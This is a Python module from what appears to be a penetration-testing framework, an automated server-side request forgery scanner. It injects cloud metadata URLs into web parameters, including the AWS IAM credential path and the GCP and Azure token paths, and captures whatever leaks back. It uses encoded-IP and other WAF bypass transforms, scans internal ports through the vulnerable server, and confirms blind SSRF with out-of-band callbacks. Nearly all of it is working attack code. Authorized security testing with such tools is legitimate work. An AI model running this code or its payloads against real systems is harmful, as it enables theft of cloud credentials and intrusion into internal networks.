import asyncio
import aiohttp
import time
import re
from hellhound.core import oob_utils, ai_utils

NAME = "ssrf_detector"
CATEGORY = "vuln"
DESCRIPTION = "Blind, OOB & Cloud Metadata SSRF Auditor"

OPTIONS = [
    {"name": "timeout", "type": int, "default": 10, "help": "Request timeout (seconds)"},
    {"name": "concurrency", "type": int, "default": 10, "help": "Concurrent attack threads"},
    {"name": "internal_probing", "type": bool, "default": True, "help": "Probe common internal metadata services"},
    {"name": "port_scan", "type": bool, "default": True, "help": "Use SSRF primitive to scan internal ports"},
    {"name": "ai_impact", "type": bool, "default": True, "help": "Use AI for impact analysis on confirmed SSRF"},
]

# ─────────────────────────────────────────────────────────────────────────────
# PAYLOADS — Cloud Metadata + Internal Services
# ─────────────────────────────────────────────────────────────────────────────

CLOUD_METADATA = [
    # AWS IMDSv1
    {"url": "http://169.254.169.254/latest/meta-data/", "name": "AWS IMDSv1 (meta-data)", "sigs": ["ami-id", "instance-id", "instance-type"]},
    {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "name": "AWS IAM Credentials", "sigs": ["AccessKeyId", "SecretAccessKey"]},
    {"url": "http://169.254.169.254/latest/user-data/", "name": "AWS User Data", "sigs": ["#!/", "cloud-init"]},
    # GCP
    {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "name": "GCP Project ID", "sigs": [], "headers": {"Metadata-Flavor": "Google"}},
    {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "name": "GCP Service Account Token", "sigs": ["access_token"], "headers": {"Metadata-Flavor": "Google"}},
    # Azure
    {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "name": "Azure Instance Metadata", "sigs": ["compute", "vmId"], "headers": {"Metadata": "true"}},
    {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "name": "Azure Managed Identity Token", "sigs": ["access_token"], "headers": {"Metadata": "true"}},
    # DigitalOcean
    {"url": "http://169.254.169.254/metadata/v1/", "name": "DigitalOcean Metadata", "sigs": ["droplet_id"]},
    # Alibaba Cloud
    {"url": "http://100.100.100.200/latest/meta-data/", "name": "Alibaba Cloud Metadata", "sigs": ["instance-id"]},
]

INTERNAL_TARGETS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0x7f000001",
    "http://0177.0.0.1",
    "http://10.0.0.1",
    "http://192.168.1.1",
    "http://172.16.0.1",
]

# Internal port scanning via SSRF primitive
INTERNAL_PORTS = [80, 443, 8080, 8443, 3000, 3306, 5432, 6379, 27017, 9200, 8888, 9090, 5000, 4443]

# URL bypass techniques for WAFs/filters
BYPASS_TRANSFORMS = [
    lambda u: u,                                          # Original
    lambda u: u.replace("127.0.0.1", "0x7f000001"),      # Hex IP
    lambda u: u.replace("127.0.0.1", "0177.0.0.1"),      # Octal IP
    lambda u: u.replace("127.0.0.1", "2130706433"),       # Decimal IP
    lambda u: u.replace("http://", "http://evil@"),       # Credential bypass
    lambda u: u + "#",                                     # Fragment bypass
    lambda u: u.replace("://", "://%2500"),                # Null byte in host
]

# ─────────────────────────────────────────────────────────────────────────────
# AUDITOR ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class SSRFAuditor:
    def __init__(self, emit, session, options):
        self.emit = emit
        self.session = session
        self.options = options
        self.oob_url = oob_utils.resolve_oob_url(options)
        self.findings = []
        self.semaphore = asyncio.Semaphore(options.get("concurrency", 10))

    async def audit_param(self, url, method, pname):
        """Full SSRF audit for a single parameter."""
        tasks = []
        
        # 1. Cloud Metadata Probing
        if self.options.get("internal_probing"):
            for meta in CLOUD_METADATA:
                tasks.append(self._test_metadata(url, method, pname, meta))
        
        # 2. Internal Service Probing
        for internal in INTERNAL_TARGETS:
            tasks.append(self._test_internal(url, method, pname, internal))
        
        # 3. Internal Port Scanning
        if self.options.get("port_scan"):
            for port in INTERNAL_PORTS:
                tasks.append(self._test_port(url, method, pname, port))
        
        # 4. OOB Triggers
        if self.oob_url:
            tasks.append(self._test_oob(url, method, pname))
        
        await asyncio.gather(*tasks)

    async def _test_metadata(self, url, method, pname, meta):
        """Test cloud metadata endpoint via SSRF."""
        async with self.semaphore:
            try:
                async with self.session.request(method, url, params={pname: meta["url"]}, timeout=self.options.get("timeout")) as r:
                    body = await r.text()
                    if r.status == 200:
                        # Check for specific signatures
                        if meta["sigs"]:
                            for sig in meta["sigs"]:
                                if sig in body:
                                    self._add_finding(url, pname, "CLOUD_METADATA_SSRF", "CRITICAL",
                                        f"Cloud metadata leaked via {meta['name']}! Found '{sig}' in response.",
                                        meta["url"], body[:300])
                                    return
                        elif len(body) > 50:
                            # No specific sigs but got a meaningful response
                            self._add_finding(url, pname, "CLOUD_METADATA_SSRF", "HIGH",
                                f"Potential cloud metadata access via {meta['name']} ({len(body)} bytes response).",
                                meta["url"], body[:200])
            except:
                pass

    async def _test_internal(self, url, method, pname, internal_url):
        """Test internal service access."""
        for transform in BYPASS_TRANSFORMS[:3]:  # Use top 3 bypass techniques
            transformed = transform(internal_url)
            async with self.semaphore:
                try:
                    async with self.session.request(method, url, params={pname: transformed}, timeout=self.options.get("timeout")) as r:
                        body = await r.text()
                        if r.status == 200 and len(body) > 100:
                            # Check it's not just an error page
                            if not any(err in body.lower() for err in ["not found", "error", "invalid"]):
                                self._add_finding(url, pname, "INTERNAL_SSRF", "HIGH",
                                    f"Internal service accessed: {transformed} ({len(body)} bytes)",
                                    transformed, body[:200])
                                return
                except:
                    pass

    async def _test_port(self, url, method, pname, port):
        """Use SSRF to probe internal ports via response timing."""
        target = f"http://127.0.0.1:{port}"
        async with self.semaphore:
            try:
                t0 = time.time()
                async with self.session.request(method, url, params={pname: target}, timeout=5) as r:
                    elapsed = time.time() - t0
                    body = await r.text()
                    
                    if r.status == 200 and len(body) > 50:
                        self._add_finding(url, pname, "INTERNAL_PORT_OPEN", "MEDIUM",
                            f"Internal port {port} appears open via SSRF (responded in {elapsed:.2f}s)",
                            target, body[:100])
            except:
                pass

    async def _test_oob(self, url, method, pname):
        """Test for blind SSRF using OOB callback."""
        token = f"ssrf-{pname}-{int(time.time())}"
        oob_target = f"{self.oob_url}/{token}"
        async with self.semaphore:
            try:
                async with self.session.request(method, url, params={pname: oob_target}) as r:
                    await r.read()
                
                oob_server = self.options.get("oob_server")
                if oob_server:
                    hit, data = oob_server.poll(token, timeout=5)
                    if hit:
                        self._add_finding(url, pname, "BLIND_OOB_SSRF", "HIGH",
                            f"Confirmed blind SSRF via OOB callback! Token: {token}",
                            oob_target, str(data))
            except:
                pass

    def _add_finding(self, url, pname, vuln_type, severity, evidence, payload, snippet=""):
        # Deduplication
        if any(f["url"] == url and f["parameter"] == pname and f["type"] == vuln_type for f in self.findings):
            return
        
        finding = {
            "url": url,
            "parameter": pname,
            "type": vuln_type,
            "severity": severity,
            "evidence": evidence,
            "payload": payload,
            "snippet": snippet,
            "repro_data": {"url": url, "method": "GET", "params": {pname: payload}}
        }
        self.findings.append(finding)
        self.emit.warn(f"    [!] {vuln_type}: {pname} on {url} ({severity})")

async def run(target, emit, options=None):
    emit.info(f"[*] SSRF_DETECTOR: Multi-Cloud SSRF audit for {target}")
    
    oob_url = oob_utils.resolve_oob_url(options)
    if not oob_url:
        emit.info("    [i] No OOB server active. Blind SSRF detection limited to cloud metadata + internal probes.")

    # Prioritize params flagged as SSRF_POTENTIAL
    hydra_intel = options.get("hydra_intel", {}) if options else {}
    surfaces = [s for s in hydra_intel.get("surfaces", []) if "SSRF_POTENTIAL" in s.get("roles", []) or "EXTERNAL_SINK" in s.get("roles", [])]
    
    if not surfaces:
        spider_intel = options.get("spider_intel", {}) if options else {}
        for ep in spider_intel.get("endpoints", []):
            params = ep.get("params", {})
            # Self-healing parameter iteration
            all_params = []
            if isinstance(params, dict):
                for bucket in params.values():
                    if isinstance(bucket, list): all_params.extend(bucket)
            elif isinstance(params, list):
                all_params = params

            for p in all_params:
                if any(x in str(p).lower() for x in ["url", "uri", "path", "dest", "redirect", "file", "page", "proxy", "callback", "next", "link"]):
                    surfaces.append({"url": ep.get("url"), "method": ep.get("method", "GET"), "parameter": p})

    if not surfaces:
        emit.warn("[!] No suitable injection surfaces identified for SSRF testing.")
        return {"raw": "No targets", "signals": []}

    emit.info(f"    [i] Auditing {len(surfaces)} potential SSRF surface(s)...")

    async with aiohttp.ClientSession() as session:
        auditor = SSRFAuditor(emit, session, options or {})
        tasks = [auditor.audit_param(s["url"], s["method"], s["parameter"]) for s in surfaces]
        await asyncio.gather(*tasks)

    if auditor.findings:
        emit.success(f"[+] SSRF_DETECTOR complete. Found {len(auditor.findings)} vulnerabilities! Use 'analyze' for AI impact.")
    else:
        emit.info("[-] No SSRF vulnerabilities detected.")

    return {
        "raw": f"Audited {len(surfaces)} surfaces. Found {len(auditor.findings)} SSRF.",
        "intel": {"vulnerabilities": auditor.findings},
        "signals": ["SSRF_FOUND" if auditor.findings else "NO_SSRF"]
    }
